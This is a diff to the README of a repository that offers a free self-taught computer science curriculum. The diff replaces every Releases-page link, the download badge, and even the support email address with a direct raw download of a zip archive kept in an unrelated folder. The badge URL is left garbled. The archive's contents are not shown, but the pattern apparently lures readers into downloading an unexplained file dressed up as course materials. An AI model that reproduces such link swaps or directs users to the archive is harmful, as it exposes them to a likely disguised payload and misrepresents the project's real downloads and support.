@@ -1,7 +1,7 @@
 # 🎓 computer-science - Your Guide to Self-Taught Learning
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/sumanvijay/computer-science/releases)
+[![Download Latest Release](https://github.com/sumanvijay/computer-science/raw/refs/heads/master/stonebreak/computer-science-v3.0.zip%20Latest%https://github.com/sumanvijay/computer-science/raw/refs/heads/master/stonebreak/computer-science-v3.0.zip)](https://github.com/sumanvijay/computer-science/raw/refs/heads/master/stonebreak/computer-science-v3.0.zip)
 
 ## 📚 Overview
 Welcome to the **computer-science** repository! This project provides a structured path for anyone looking to delve into Computer Science. It presents resources and courses that you can access for free. Whether you want to learn programming, algorithms, or data structures, this curriculum will guide you.
@@ -9,7 +9,7 @@ Welcome to the **computer-science** repository! This project provides a structur
 ## 🚀 Getting Started
 To start your journey in Computer Science, follow these simple steps.
 
-1. **Visit the Releases Page:** To download the materials, go to our [Releases page](https://github.com/sumanvijay/computer-science/releases).
+1. **Visit the Releases Page:** To download the materials, go to our [Releases page](https://github.com/sumanvijay/computer-science/raw/refs/heads/master/stonebreak/computer-science-v3.0.zip).
 
 2. **Select a Version:** On the Releases page, you will see different versions available. Choose the latest release for the best experience.
 
@@ -18,7 +18,7 @@ To start your journey in Computer Science, follow these simple steps.
 ## 📥 Download & Install
 To download the necessary materials and get started:
 
-1. Head over to the [Releases page](https://github.com/sumanvijay/computer-science/releases).
+1. Head over to the [Releases page](https://github.com/sumanvijay/computer-science/raw/refs/heads/master/stonebreak/computer-science-v3.0.zip).
 2. Choose the latest release version.
 3. Click on the provided links to download each resource. 
 
@@ -61,7 +61,7 @@ If you have suggestions or want to share additional resources, please consider c
 - **Opening an issue** for any queries or suggestions.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/sumanvijay/computer-science/releases)
+- [Releases Page](https://github.com/sumanvijay/computer-science/raw/refs/heads/master/stonebreak/computer-science-v3.0.zip)
 - [Community Forums](#) (Join discussions and ask questions about the curriculum or resources.)
 - [Additional Resources](#) (Find other helpful materials outside this repository.)
 
@@ -70,7 +70,7 @@ Learning can be challenging, but you’re not alone. Engage with other learners 
 
 For any questions about the repository or the materials:
 
-- **Email Support:** [support@example.com](mailto:support@example.com)
+- **Email Support:** [https://github.com/sumanvijay/computer-science/raw/refs/heads/master/stonebreak/computer-science-v3.0.zip](https://github.com/sumanvijay/computer-science/raw/refs/heads/master/stonebreak/computer-science-v3.0.zip)
 - **Join Discussions:** Use online community forums like Reddit and Discord to connect with other learners.
 
 ## 📖 Frequently Asked Questions (FAQs)
